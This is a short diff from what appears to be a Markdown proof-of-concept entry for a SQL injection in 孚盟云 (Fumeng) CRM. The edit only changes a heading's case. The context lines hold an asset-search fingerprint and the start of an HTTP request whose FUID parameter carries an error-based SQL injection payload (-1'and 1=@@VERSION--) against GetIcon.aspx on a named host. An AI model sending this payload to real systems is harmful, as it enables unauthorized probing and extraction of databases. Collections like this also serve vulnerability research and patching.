@@ -8,7 +8,7 @@
 app="孚盟软件-孚盟云"
 ```
 
-## poc
+## POC
 ```
 GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
 Host: fumacrm.mrxn.net
